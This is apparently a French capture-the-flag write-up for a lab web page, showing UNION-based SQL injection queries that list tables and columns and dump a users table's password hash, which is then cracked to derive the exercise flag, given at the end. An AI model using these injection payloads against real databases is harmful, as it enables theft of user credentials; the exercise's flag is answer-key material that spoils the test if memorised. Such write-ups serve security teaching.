Sur la page members, on remarque qu'il est très facile d'avoir une erreur de syntaxe.

Dans un premier temps on vas lister les tables :
    1 UNION SELECT table_schema, table_name FROM information_schema.tables

Puis on list les colonnes :
    1 UNION SELECT TABLE_NAME, COLUMN_NAME FROM information_schema.columns

Et ensuite on liste les mdps des utilisateurs:
    1 UNION SELECT countersign, Commentaire FROM users

résulat:
    ID: 1 UNION SELECT countersign, Commentaire FROM users 
    First name: 5ff9d0165b4f92b14994e5c685cdce28
    Surname : Decrypt this password -> then lower all the char. Sh256 on it and it's good !

On décripte le hash md5 "First name" -> FortyTwo
on le réduit en minuscule et on l'encrypt en sha256 pour avoir notre flag.

Pour corriger une faille sql il faut sanitize l'entrée utilisateurs

flag : 10a16d834f9b1e4068b25c4c46fe0284e99e44dceaf08098fc83925ba6310ff5